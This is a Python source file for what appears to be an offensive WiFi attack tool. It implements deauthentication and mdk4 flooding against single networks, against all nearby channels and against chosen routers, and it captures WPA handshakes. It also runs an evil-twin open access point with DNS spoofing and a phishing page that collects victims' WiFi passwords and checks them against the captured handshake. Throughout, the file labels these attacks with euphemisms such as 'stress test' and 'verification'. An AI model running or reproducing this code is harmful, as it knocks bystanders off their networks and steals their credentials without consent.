#!/usr/bin/env python3

import os
import time
import threading
import subprocess
import http.server
import socketserver
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.attack_threads = []
        self.evil_twin_running = False
        self.captured_password = None

    def single_target_attack(self):
        """Professional Single Target Attack - DUAL ENGINE"""
        print("\033[1;36m[→] Professional target acquisition...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] Professional attack: {target['essid']}\033[0m")
                self.start_professional_single_attack(target)

    def start_professional_single_attack(self, target):
        """Professional targeted attack with client mapping"""
        self.core.set_current_operation("SINGLE_TARGET_ATTACK")
        self.attack_running = True
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[⚡] Deploying professional attack vectors...\033[0m")
        
        # PHASE 1: Client Mapping
        print("\033[1;31m[🔍] Phase 1: Client reconnaissance...\033[0m")
        client_map_file = f"/tmp/client_map_{target['bssid'].replace(':', '')}"
        
        # Start background client detection
        client_proc = self.core.run_command(
            f"airodump-ng --bssid {target['bssid']} -c {target['channel']} -w {client_map_file} --output-format csv {self.core.mon_interface} > /dev/null 2>&1 &",
            background=True
        )
        time.sleep(8)  # Allow time for client discovery
        
        # PHASE 2: Dual-Engine Attack
        print("\033[1;31m[💣] Phase 2: Dual-engine kinetic strike...\033[0m")
        
        # Engine A: Broadcast Deauth
        print("\033[1;31m[🔧] VECTOR A: Broadcast disruption\033[0m")
        proc1 = self.core.run_command(
            f"aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface} > /tmp/broadcast_deauth.log 2>&1 &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Engine B: Targeted Client Deauth
        print("\033[1;31m[🔧] VECTOR B: Targeted client elimination\033[0m")
        
        # Get clients from the scan
        target_clients = [c for c, info in self.scanner.clients.items() 
                         if info.get('bssid') == target['bssid']]
        
        if target_clients:
            print(f"\033[1;31m[🎯] Targeting {len(target_clients)} connected clients\033[0m")
            
            # Create targeted deauth script
            deauth_script = f"/tmp/targeted_deauth_{target['bssid'].replace(':', '')}.sh"
            with open(deauth_script, 'w') as f:
                f.write("#!/bin/bash\n")
                for client_mac in target_clients:
                    f.write(f"aireplay-ng --deauth 10 -a {target['bssid']} -c {client_mac} {self.core.mon_interface} > /dev/null 2>&1 &\n")
                f.write("wait\n")
            
            os.chmod(deauth_script, 0o755)
            proc2 = self.core.run_command(f"bash {deauth_script} > /tmp/targeted_deauth.log 2>&1 &", background=True)
            if proc2:
                self.attack_processes.append(proc2)
                self.core.add_attack_process(proc2)
        else:
            print("\033[1;33m[⚠️] No clients detected - using aggressive broadcast\033[0m")
            # Fallback to MDK4 for better broadcast effectiveness
            proc2 = self.core.run_command(
                f"mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} > /tmp/mdk4_attack.log 2>&1 &",
                background=True
            )
            if proc2:
                self.attack_processes.append(proc2)
                self.core.add_attack_process(proc2)
        
        # Cleanup client mapping
        if client_proc:
            client_proc.terminate()
        
        print(f"\033[1;32m[✅] {len(self.attack_processes)} professional vectors deployed\033[0m")
        print(f"\033[1;31m[💥] Target {target['essid']} under complete network blackout!\033[0m")
        
        # Professional attack animation
        anim_thread = threading.Thread(target=self.show_professional_attack_animation, args=(target['essid'],))
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop professional attack...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Professional attack terminated\033[0m")

    def mass_destruction(self):
        """Professional Mass Network Disruption - CHANNEL AGGREGATION"""
        print("\033[1;31m[🌐] Professional mass disruption protocol...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            target_count = len(self.scanner.networks)
            
            if target_count == 0:
                print("\033[1;31m[✘] No professional targets found\033[0m")
                return
            
            print(f"\033[1;33m[🎯] Professional targeting: {target_count} networks\033[0m")
            
            confirm = input("\033[1;31m[?] Confirm professional disruption? (y/N): \033[0m")
            
            if confirm.lower() in ['y', 'yes']:
                self.core.set_current_operation("MASS_DESTRUCTION")
                self.attack_running = True
                
                print("\033[1;31m[⚡] Deploying professional disruption...\033[0m")
                
                # Extract unique channels for aggregation
                unique_channels = set()
                for target in self.scanner.networks.values():
                    try:
                        unique_channels.add(target['channel'])
                    except:
                        continue
                
                if unique_channels:
                    channel_list = ','.join(str(ch) for ch in unique_channels)
                    print(f"\033[1;31m[🎯] Channel aggregation: {channel_list}\033[0m")
                    
                    # Single MDK4 process for all channels
                    print("\033[1;31m[💣] Deploying channel-wide disruption...\033[0m")
                    mdk4_proc = self.core.run_command(
                        f"mdk4 {self.core.mon_interface} d -c {channel_list} > /tmp/mdk4_mass_disruption.log 2>&1 &",
                        background=True
                    )
                    
                    if mdk4_proc:
                        self.attack_processes.append(mdk4_proc)
                        self.core.add_attack_process(mdk4_proc)
                        print(f"\033[1;32m[✅] Professional mass disruption active!\033[0m")
                        
                        # Professional animation
                        anim_thread = threading.Thread(target=self.show_mass_attack_animation)
                        anim_thread.daemon = True
                        anim_thread.start()
                        
                        print("\033[1;33m[⏹️] Press Enter to stop professional disruption...\033[0m")
                        input()
                
                self.stop_attacks()
                self.core.clear_current_operation()
                print("\033[1;32m[✅] Professional disruption terminated\033[0m")
            else:
                print("\033[1;33m[❌] Professional disruption cancelled\033[0m")

    def router_destroyer(self):
        """Professional Router Stress Test - HARDWARE STRESS"""
        print("\033[1;31m[💀] Professional router assessment...\033[0m")
        
        confirm1 = input("\033[1;31m[?] Type 'STRESS' to confirm: \033[0m")
        if confirm1.lower() != 'stress':
            print("\033[1;33m[❌] Professional test cancelled\033[0m")
            return
            
        confirm2 = input("\033[1;31m[?] Type 'CONFIRM' to proceed: \033[0m")
        if confirm2.lower() != 'confirm':
            print("\033[1;33m[❌] Professional test cancelled\033[0m")
            return
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💀] Professional stress test: {target['essid']}\033[0m")
                self.start_professional_router_stress(target)

    def start_professional_router_stress(self, target):
        """Start professional router stress test"""
        self.core.set_current_operation("ROUTER_STRESS_TEST")
        self.attack_running = True
        
        print("\033[1;31m[⚡] Professional stress vectors...\033[0m")
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Professional stress vectors
        print("\033[1;31m[🔧] VECTOR 1: Authentication Flood\033[0m")
        proc1 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} a -a {target['bssid']} -m > /tmp/auth_flood.log 2>&1 &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        print("\033[1;31m[🔧] VECTOR 2: EAPOL Flood\033[0m")
        proc2 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} x -t {target['bssid']} -n {target['essid']} > /tmp/eapol_flood.log 2>&1 &",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        print("\033[1;31m[🔧] VECTOR 3: Deauth Storm\033[0m")
        proc3 = self.core.run_command(
            f"while true; do aireplay-ng --deauth 100 -a {target['bssid']} {self.core.mon_interface} > /tmp/deauth_storm.log 2>&1; sleep 1; done &",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        print(f"\033[1;32m[✅] Professional stress test active\033[0m")
        print(f"\033[1;31m[💥] Router {target['essid']} under hardware stress!\033[0m")
        
        # Stress animation
        anim_thread = threading.Thread(target=self.show_router_stress_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop professional stress test...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Professional stress test terminated\033[0m")

    def advanced_evil_twin(self):
        """Professional Access Point Replication - OPEN AP + VERIFICATION"""
        print("\033[1;36m[→] Professional AP replication protocol...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;34m[👥] Professional replication: {target['essid']}\033[0m")
                
                # First capture handshake for verification
                print("\033[1;36m[→] Phase 1: Capturing handshake for verification...\033[0m")
                if self.capture_handshake_for_evil_twin(target):
                    self.start_professional_open_ap(target)
                else:
                    print("\033[1;31m[✘] Handshake capture failed - cannot proceed with verification\033[0m")

    def capture_handshake_for_evil_twin(self, target):
        """Capture handshake for evil twin verification"""
        print("\033[1;36m[→] Starting handshake capture...\033[0m")
        
        handshake_file = f"/tmp/evil_twin_handshake_{target['bssid'].replace(':', '')}"
        
        # Start handshake capture
        capture_proc = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {handshake_file} {self.core.mon_interface} > /dev/null 2>&1 &",
            background=True
        )
        
        # Start deauth to force handshake
        deauth_proc = self.core.run_command(
            f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1",
            background=True
        )
        
        print("\033[1;36m[⏱️] Capturing handshake for 30 seconds...\033[0m")
        time.sleep(30)
        
        # Stop capture
        if capture_proc:
            capture_proc.terminate()
        if deauth_proc:
            deauth_proc.terminate()
        
        # Check if handshake was captured
        cap_file = f"{handshake_file}-01.cap"
        if os.path.exists(cap_file) and self.check_handshake(cap_file, target['bssid']):
            print("\033[1;32m[✅] Handshake captured for verification\033[0m")
            return True
        else:
            print("\033[1;31m[✘] Handshake capture failed\033[0m")
            return False

    def check_handshake(self, cap_file, bssid):
        """Check if handshake is valid"""
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '{bssid}'")
        return result and "1 handshake" in result.stdout

    def start_professional_open_ap(self, target):
        """Start professional open AP with verification loop"""
        try:
            self.core.set_current_operation("AP_REPLICATION")
            self.evil_twin_running = True
            
            print("\033[1;36m[→] Professional Open AP deployment...\033[0m")
            
            # Stop NetworkManager
            self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
            time.sleep(2)
            
            # Set channel
            self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
            
            # Professional OPEN AP configuration (no password)
            hostapd_conf = f"""
interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
            
            with open("/tmp/pro_open_ap.conf", "w") as f:
                f.write(hostapd_conf)
            
            # Professional dnsmasq configuration with DNS spoofing
            dnsmasq_conf = f"""
interface={self.core.mon_interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
address=/#/192.168.1.1
log-queries
log-dhcp
"""
            
            with open("/tmp/pro_dnsmasq.conf", "w") as f:
                f.write(dnsmasq_conf)
            
            # Configure interface
            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
            
            # Start professional services
            print("\033[1;36m[→] Starting professional services...\033[0m")
            dnsmasq_proc = self.core.run_command("dnsmasq -C /tmp/pro_dnsmasq.conf", background=True)
            if dnsmasq_proc:
                self.attack_processes.append(dnsmasq_proc)
                self.core.add_attack_process(dnsmasq_proc)
            
            hostapd_proc = self.core.run_command("hostapd /tmp/pro_open_ap.conf", background=True)
            if hostapd_proc:
                self.attack_processes.append(hostapd_proc)
                self.core.add_attack_process(hostapd_proc)
            
            time.sleep(5)
            
            # Start phishing web server
            print("\033[1;36m[→] Starting verification web server...\033[0m")
            web_thread = threading.Thread(target=self.start_phishing_server)
            web_thread.daemon = True
            web_thread.start()
            
            # Professional deauth attack to lure victims
            print("\033[1;36m[→] Professional deauth synchronization...\033[0m")
            deauth_proc = self.core.run_command(
                f"while true; do aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /tmp/pro_deauth.log 2>&1; sleep 3; done &",
                background=True
            )
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
            
            print("\033[1;32m[✅] Professional Open AP replication active!\033[0m")
            print(f"\033[1;32m[📡] Network: {target['essid']} (Open Access)\033[0m")
            print("\033[1;32m[🔓] No password required - victims auto-connect\033[0m")
            print("\033[1;33m[👀] Professional verification active...\033[0m")
            print("\033[1;33m[⏹️] Press Enter to stop professional replication...\033[0m")
            
            # Professional monitoring
            monitor_thread = threading.Thread(target=self.monitor_verification_loop, args=(target,))
            monitor_thread.daemon = True
            monitor_thread.start()
            
            input()
            
            # Cleanup
            self.stop_professional_ap()
            self.core.clear_current_operation()
            print("\033[1;32m[✅] Professional AP replication terminated\033[0m")
            
        except Exception as e:
            print(f"\033[1;31m[✘] Professional replication failed: {e}\033[0m")
            self.stop_professional_ap()
            self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def start_phishing_server(self):
        """Start phishing web server for password capture"""
        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    html = """
                    <html>
                    <head><title>Network Authentication Required</title></head>
                    <body>
                    <h2>Network Authentication Required</h2>
                    <p>Please enter your WiFi password to continue:</p>
                    <form method="POST">
                    <input type="password" name="password" placeholder="WiFi Password" required>
                    <input type="submit" value="Connect">
                    </form>
                    </body>
                    </html>
                    """
                    self.wfile.write(html.encode())
                else:
                    self.send_error(404)
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                
                # Extract password
                if 'password=' in post_data:
                    password = post_data.split('password=')[1].split('&')[0]
                    # Save password for verification
                    with open("/tmp/captured_password.txt", "w") as f:
                        f.write(password)
                    print(f"\033[1;32m[🔑] Password captured: {password}\033[0m")
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h2>Connecting...</h2></body></html>")
        
        server = socketserver.TCPServer(("", 80), PhishingHandler)
        server.serve_forever()

    def monitor_verification_loop(self, target):
        """Monitor and verify captured passwords"""
        handshake_file = f"/tmp/evil_twin_handshake_{target['bssid'].replace(':', '')}-01.cap"
        
        while self.evil_twin_running:
            # Check for captured passwords
            if os.path.exists("/tmp/captured_password.txt"):
                with open("/tmp/captured_password.txt", "r") as f:
                    password = f.read().strip()
                
                if password:
                    print(f"\033[1;33m[🔍] Verifying password: {password}\033[0m")
                    
                    # Verify against captured handshake
                    result = self.core.run_command(
                        f"aircrack-ng -w - -b {target['bssid']} {handshake_file} <<< '{password}'"
                    )
                    
                    if result and "KEY FOUND" in result.stdout:
                        print(f"\033[1;32m[🎉] PASSWORD VERIFIED: {password}\033[0m")
                        self.save_cracked_password(target, password)
                        # Remove password file to avoid re-processing
                        os.remove("/tmp/captured_password.txt")
                    else:
                        print(f"\033[1;31m[✘] Invalid password: {password}\033[0m")
                        # Keep the file to show error on phishing page
                
            time.sleep(5)

    def save_cracked_password(self, target, password):
        """Save cracked password professionally"""
        try:
            with open("/tmp/netstrike_cracked.txt", "a") as f:
                f.write(f"Network: {target['essid']} | BSSID: {target['bssid']} | Password: {password}\n")
            print(f"\033[1;32m[💾] Password saved to: /tmp/netstrike_cracked.txt\033[0m")
        except:
            pass

    def stop_professional_ap(self):
        """Stop professional AP replication"""
        self.evil_twin_running = False
        self.stop_attacks()
        self.core.run_command("pkill hostapd")
        self.core.run_command("pkill dnsmasq")
        self.core.run_command("pkill python3")
        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def show_professional_attack_animation(self, essid):
        """Professional attack animation"""
        frames = ["⚡", "💥", "🔥", "🌪️", "🌀"]
        messages = [
            f"Professional disruption: {essid}",
            f"Network interference: {essid}",
            f"Signal jamming: {essid}",
            f"Professional attack: {essid}"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Professional attack active!\033[0m", end='\r')
            time.sleep(0.4)

    def show_mass_attack_animation(self):
        """Professional mass attack animation"""
        frames = ["🌐", "⚡", "💥", "🔥", "🌪️"]
        messages = [
            "Professional mass disruption",
            "Network-wide interference", 
            "Multi-target professional attack",
            "Professional disruption active"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Professional mass attack!\033[0m", end='\r')
            time.sleep(0.4)

    def show_router_stress_animation(self):
        """Professional router stress animation"""
        frames = ["💀", "⚡", "💥", "🔥", "🌡️"]
        messages = [
            "Professional router stress test",
            "Hardware performance assessment",
            "Router stability evaluation",
            "Professional stress testing"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Professional assessment!\033[0m", end='\r')
            time.sleep(0.4)

    def stop_attacks(self):
        """Stop all professional attacks"""
        self.attack_running = False
        self.evil_twin_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
